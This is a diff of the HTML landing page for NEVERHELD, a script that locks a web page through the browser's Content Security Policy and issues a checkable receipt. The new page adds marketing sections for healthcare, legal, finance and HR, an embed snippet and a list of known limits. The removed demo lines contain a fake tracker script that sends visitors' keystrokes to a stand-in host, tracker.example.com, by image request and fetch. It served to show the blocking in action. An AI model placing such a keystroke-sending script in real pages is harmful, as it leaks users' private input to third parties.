@@ -2,52 +2,160 @@
 <html lang="en">
 <head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>NEVERHELD demo: sealed in the browser, proof you can check</title>
+<title>NEVERHELD: private stays private, and you get the receipt</title>
+<meta name="description" content="NEVERHELD locks a web page so it cannot send what you type, then gives you a receipt you can check yourself.">
 <style>
-body{font:16px/1.6 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;max-width:760px;margin:40px auto;padding:0 20px;color:#17202c}
-h1{font-size:30px;margin-bottom:4px}.tag{color:#4e6b62;margin-top:0}
-.card{border:1px solid #d5dde5;border-radius:12px;padding:20px;margin:20px 0}
-label{display:block;font-weight:600;margin-top:12px}input,textarea{width:100%;box-sizing:border-box;padding:8px;font:inherit;border:1px solid #b8c2cc;border-radius:6px}
-ol li{margin:4px 0}.small{font-size:14px;color:#596574}.warn{background:#fff7e6;border-color:#f0d9a8}
-a{color:#0b5e4a}
+:root{--ink:#14202b;--muted:#5a6878;--brand:#0f6b55;--brand-dark:#0a4d3d;--soft:#eef6f3;--line:#dde5ec;--warm:#fff8ec}
+*{box-sizing:border-box}html{scroll-behavior:smooth}
+body{margin:0;font:17px/1.65 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;color:var(--ink);background:#fff}
+a{color:var(--brand)}
+.wrap{max-width:1080px;margin:0 auto;padding:0 22px}
+nav{position:sticky;top:0;background:rgba(255,255,255,.94);backdrop-filter:blur(6px);border-bottom:1px solid var(--line);z-index:5}
+nav .wrap{display:flex;align-items:center;justify-content:space-between;height:60px}
+.logo{font-weight:800;letter-spacing:.08em;color:var(--ink);text-decoration:none}
+.logo span{color:var(--brand)}
+nav .links a{margin-left:20px;text-decoration:none;color:var(--muted);font-size:15px}
+nav .links a.cta{color:#fff;background:var(--brand);padding:8px 14px;border-radius:8px}
+@media(max-width:720px){nav .links a:not(.cta){display:none}}
+.hero{padding:72px 0 56px;background:linear-gradient(180deg,var(--soft),#fff)}
+.hero h1{font-size:clamp(34px,5.4vw,56px);line-height:1.08;margin:0 0 18px;max-width:820px}
+.hero p.lead{font-size:clamp(18px,2.2vw,22px);color:var(--muted);max-width:700px;margin:0 0 28px}
+.btn{display:inline-block;padding:14px 22px;border-radius:10px;font-weight:700;text-decoration:none;margin:0 10px 10px 0}
+.btn.primary{background:var(--brand);color:#fff}.btn.primary:hover{background:var(--brand-dark)}
+.btn.ghost{border:2px solid var(--brand);color:var(--brand)}
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin:44px 0 0}
+@media(max-width:820px){.steps{grid-template-columns:1fr}}
+.step{background:#fff;border:1px solid var(--line);border-radius:14px;padding:22px}
+.step .n{display:inline-grid;place-items:center;width:34px;height:34px;border-radius:50%;background:var(--brand);color:#fff;font-weight:800;margin-bottom:8px}
+.step h3{margin:4px 0 6px;font-size:20px}.step p{margin:0;color:var(--muted)}
+section{padding:64px 0;border-top:1px solid var(--line)}
+section h2{font-size:clamp(28px,3.6vw,38px);margin:0 0 10px}
+section .intro{color:var(--muted);max-width:720px;margin:0 0 30px}
+.story{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+@media(max-width:820px){.story{grid-template-columns:1fr}}
+.box{border-radius:14px;padding:22px;border:1px solid var(--line)}
+.box.bad{background:var(--warm)}.box.good{background:var(--soft)}
+.box h3{margin:0 0 8px}
+.verticals{display:grid;gap:22px}
+.vertical{border:1px solid var(--line);border-radius:16px;padding:26px;scroll-margin-top:80px}
+.vertical header{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:12px}
+.vertical h3{margin:0;font-size:24px}
+.badge{font-size:13px;font-weight:700;padding:4px 10px;border-radius:999px;background:var(--brand);color:#fff}
+.badge.alt{background:#e6eef5;color:#33465a}
+.sub{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+@media(max-width:820px){.sub{grid-template-columns:1fr}}
+.sub div{background:#fafcfd;border:1px solid var(--line);border-radius:12px;padding:16px}
+.sub h4{margin:0 0 6px;font-size:13px;text-transform:uppercase;letter-spacing:.06em;color:var(--brand)}
+.sub p{margin:0;font-size:16px}
+.jump{display:flex;flex-wrap:wrap;gap:10px;margin:0 0 28px}
+.jump a{font-size:15px;text-decoration:none;border:1px solid var(--line);padding:7px 12px;border-radius:999px;color:var(--ink)}
+.jump a:hover{border-color:var(--brand);color:var(--brand)}
+pre{background:#0f1c26;color:#d8f3e8;padding:18px;border-radius:12px;overflow:auto;font-size:14px}
+.honest li{margin:6px 0}
+footer{padding:36px 0;border-top:1px solid var(--line);color:var(--muted);font-size:15px}
 </style>
 </head>
 <body>
-<h1>NEVERHELD</h1>
-<p class="tag">Sealed in the browser. Proof you can check.</p>
+<nav><div class="wrap"><a class="logo" href="#">NEVER<span>HELD</span></a>
+<div class="links"><a href="#how">How it works</a><a href="#who">Who it's for</a><a href="#buyers">For companies</a><a class="cta" href="/demo.html">Try it (1 min)</a></div></div></nav>
 
-<div class="card">
-<strong>Try it in 2 minutes</strong>
-<ol>
-<li>Wait for the dialog to close. The page is now sealed (top right: <em>NOPE: 0</em>).</li>
-<li>Type in the form below. This page also carries a fake "tracking pixel" that tries to send everything you type to another site.</li>
-<li>Watch <em>Blocked</em> go up: the browser refused each attempt. NOPE stays at 0.</li>
-<li>Press <em>Proof and checks</em>, then <em>Download JSON proof</em>.</li>
-<li>Open the <a href="/verify.html" target="_blank" rel="noopener">offline verifier</a> and choose the proof file. Change one character in the file and check it again: it fails.</li>
-</ol>
+<header class="hero"><div class="wrap">
+<h1>Private stays private, and you get the receipt.</h1>
+<p class="lead">NEVERHELD locks a web page so it can't send what you type to anyone. Then it gives you a receipt you can check yourself, without having to trust the company.</p>
+<a class="btn primary" href="/demo.html">Try it now: no sign-up</a><a class="btn ghost" href="#how">How it works</a>
+<div class="steps" id="how">
+<div class="step"><div class="n">1</div><h3>Lock</h3><p>When the page has loaded, NEVERHELD tells your browser: "this page may not send anything anywhere." The browser enforces it.</p></div>
+<div class="step"><div class="n">2</div><h3>Count</h3><p>If anything on the page tries to send your data, such as a hidden ad tracker, the browser refuses, and NEVERHELD counts the attempt where you can see it.</p></div>
+<div class="step"><div class="n">3</div><h3>Receipt</h3><p>You download a receipt of what happened. You can check it on any computer, even offline. If someone changes it, the check fails.</p></div>
 </div>
+</div></header>
 
-<div class="card">
-<strong>Sample patient intake (demo: nothing is stored or sent)</strong>
-<label for="name">Name</label><input id="name" autocomplete="off">
-<label for="symptoms">Symptoms</label><textarea id="symptoms" rows="3"></textarea>
-<label for="file">Attach a document (fingerprinted in your browser, never uploaded)</label><input id="file" type="file">
+<section><div class="wrap">
+<h2>Why this matters</h2>
+<p class="intro">Most websites carry hidden "trackers" from ad and analytics companies. On a normal shop that's annoying. On a page where you describe your health, your money or a legal problem, it's a real leak, and companies are paying for it in court.</p>
+<div class="story">
+<div class="box bad"><h3>Without NEVERHELD</h3><p>You type "chest pain since Tuesday" into a hospital's form. A tracker on the page quietly sends it to an ad company. Nobody can prove afterwards what was or wasn't sent.</p></div>
+<div class="box good"><h3>With NEVERHELD</h3><p>The same form is locked. The tracker tries, the browser says no, and the counter shows it. The patient and the hospital both get a receipt of what the page did.</p></div>
 </div>
+</div></section>
 
-<div class="card warn small">
-<strong>What this does and does not show.</strong> After sealing, the browser's Content Security Policy refuses this page's fetch, beacon, WebSocket, form and resource requests, and NEVERHELD blocks WebRTC and network hints inside the page. Known limits: WebRTC through an iframe's own copy, a Safari preconnect, browser extensions, other tabs, and whole-tab navigation. The proof is written by the page itself; it is evidence, not a signed record of the session or an independent audit. <a href="https://github.com/jakinmade/Neverheld" rel="noopener">Read the full limits</a>.
+<section id="who"><div class="wrap">
+<h2>Who it's for</h2>
+<p class="intro">Any web page where people type or upload something private. These are the areas where it matters most.</p>
+<div class="jump">
+<a href="#health">Healthcare</a><a href="#mental">Mental health</a><a href="#legal">Legal</a><a href="#finance">Money &amp; tax</a><a href="#hr">Hiring &amp; HR</a><a href="#docs">Document tools</a><a href="#trust">Security reviews</a>
 </div>
+<div class="verticals">
 
-<p class="small">Evaluation build 0.3.2 (unsigned): <a href="/download/neverheld-0.3.2.tar.gz">download the package</a> · <a href="/download/neverheld-0.3.2.tar.gz.sha256">SHA-256</a>. Licence: all rights reserved; evaluation by written agreement. Contact: <a href="mailto:john@akinmade.co.uk">john@akinmade.co.uk</a></p>
+<article class="vertical" id="health"><header><h3>Healthcare</h3><span class="badge">Biggest need</span></header>
+<div class="sub">
+<div><h4>The problem</h4><p>Hospitals and clinics have paid out more than $100 million in recent years over trackers on their websites that sent patient searches and form entries to ad companies.</p></div>
+<div><h4>What NEVERHELD does</h4><p>It locks symptom checkers, booking forms and "find a doctor" pages, so trackers can't send what patients type, and it gives each visit a receipt the provider's lawyers can use.</p></div>
+<div><h4>Example</h4><p>A clinic's intake form shows "Blocked: 2" when the old ad tracker tries to send the patient's answers, and the receipt is saved with the record.</p></div>
+</div></article>
 
-<script>
-// The fake "tracking pixel": a typical third-party tag that sends what the visitor types.
-document.addEventListener("input", function (event) {
-  var value = encodeURIComponent((event.target && event.target.value || "").slice(-40));
-  new Image().src = "https://tracker.example.com/pixel.gif?q=" + value;
-  try { fetch("https://tracker.example.com/collect", { method: "POST", body: value }).catch(function () {}); } catch (e) {}
-});
-</script>
-<script src="/neverheld.min.js" data-auto-seal data-application="NEVERHELD public demo" data-version="0.3.2" data-workers-network="none"></script>
+<article class="vertical" id="mental"><header><h3>Mental health</h3><span class="badge">High need</span></header>
+<div class="sub">
+<div><h4>The problem</h4><p>Therapy sign-ups and mood check-ins hold some of the most sensitive things people ever write down, and several online therapy firms have been in trouble for sharing that data.</p></div>
+<div><h4>What NEVERHELD does</h4><p>It locks the sign-up and check-in pages and gives the app evidence for its promise: "we don't share what you tell us."</p></div>
+<div><h4>Example</h4><p>A therapy app shows users a "locked page" badge and lets them download the receipt for their own records.</p></div>
+</div></article>
+
+<article class="vertical" id="legal"><header><h3>Legal</h3><span class="badge">High need</span></header>
+<div class="sub">
+<div><h4>The problem</h4><p>Lawyers must judge whether client information reaches a third party or an AI service when they use online tools. Usually they have to take the tool's word for it.</p></div>
+<div><h4>What NEVERHELD does</h4><p>It locks the page where case documents are reviewed and gives a receipt per matter showing what that page did.</p></div>
+<div><h4>Example</h4><p>A barrister prepares a court bundle in a locked page and keeps the receipt in the case file.</p></div>
+</div></article>
+
+<article class="vertical" id="finance"><header><h3>Money &amp; tax</h3><span class="badge alt">Good fit</span></header>
+<div class="sub">
+<div><h4>The problem</h4><p>People type income, debts and tax details into calculators and filing tools, and some of those sites have been caught passing the details to ad platforms.</p></div>
+<div><h4>What NEVERHELD does</h4><p>It locks the calculator or form so the figures stay on the page, and the receipt becomes a trust signal for customers.</p></div>
+<div><h4>Example</h4><p>A mortgage calculator says "Your numbers never leave this page. Check the receipt."</p></div>
+</div></article>
+
+<article class="vertical" id="hr"><header><h3>Hiring &amp; HR</h3><span class="badge alt">Good fit</span></header>
+<div class="sub">
+<div><h4>The problem</h4><p>CV checkers, salary tools and right-to-work checks handle personal documents that candidates never expected to be shared.</p></div>
+<div><h4>What NEVERHELD does</h4><p>It locks the upload and review pages. Each file is fingerprinted in the browser (never uploaded), and the receipt lists it.</p></div>
+<div><h4>Example</h4><p>A candidate checks their CV in a locked page and gets a receipt showing the file was only processed in their own browser.</p></div>
+</div></article>
+
+<article class="vertical" id="docs"><header><h3>Document tools</h3><span class="badge alt">Good fit</span></header>
+<div class="sub">
+<div><h4>The problem</h4><p>Many PDF editors, converters and redaction tools say "processed in your browser". Users have to believe them.</p></div>
+<div><h4>What NEVERHELD does</h4><p>It turns that claim into something a user can check: the page is locked, and the receipt shows what it did.</p></div>
+<div><h4>Example</h4><p>A redaction tool adds a "Check it yourself" button next to its privacy promise.</p></div>
+</div></article>
+
+<article class="vertical" id="trust"><header><h3>Security reviews</h3><span class="badge alt">Channel</span></header>
+<div class="sub">
+<div><h4>The problem</h4><p>"Do you access customer data?" is the most-asked question in security questionnaires. The usual answer is a policy document.</p></div>
+<div><h4>What NEVERHELD does</h4><p>It gives vendors evidence per session, with answers already written for the questions reviewers ask (HIPAA, SOC 2, vendor questionnaires and more).</p></div>
+<div><h4>Example</h4><p>A trust-centre platform shows NEVERHELD receipts alongside its customer's security answers.</p></div>
+</div></article>
+
+</div></div></section>
+
+<section id="buyers"><div class="wrap">
+<h2>For companies: one line of code</h2>
+<p class="intro">NEVERHELD is a single file of about 13 KB with nothing else to install. Add it to the page you want to lock. It works with plain HTML and Next.js, and is tested in Chrome, Firefox and Safari's engine.</p>
+<pre>&lt;script src="/neverheld.min.js" data-auto-seal&gt;&lt;/script&gt;</pre>
+<p>Available for a paid pilot, licence or outright purchase. <a class="btn primary" href="mailto:john@akinmade.co.uk?subject=NEVERHELD">Talk to John</a><a class="btn ghost" href="/download/neverheld-0.3.2.tar.gz">Download the evaluation pack</a></p>
+</div></section>
+
+<section><div class="wrap">
+<h2>How sure is this?</h2>
+<p class="intro">We would rather be exact than oversell it.</p>
+<ul class="honest">
+<li><strong>Enforced by the browser:</strong> once locked, the page's normal ways of sending data (forms, uploads, background requests, trackers, images, scripts) are refused.</li>
+<li><strong>Also blocked by NEVERHELD itself:</strong> WebRTC and network "hints". This is done by the page, so determined code could get round it.</li>
+<li><strong>Not covered:</strong> browser extensions, other tabs, anything before the lock, opening a new window, a WebRTC route through hidden frames, and a Safari quirk with preconnect hints.</li>
+<li><strong>The receipt</strong> is written by the page itself. It is strong evidence, not a signed record or an independent audit. Three review rounds have been done and published; an independent audit has not.</li>
+</ul>
+</div></section>
+
+<footer><div class="wrap">NEVERHELD · evaluation build 0.3.2 · <a href="/demo.html">Try it</a> · <a href="/verify.html">Receipt checker</a> · <a href="mailto:john@akinmade.co.uk">john@akinmade.co.uk</a></div></footer>
 </body>
 </html>
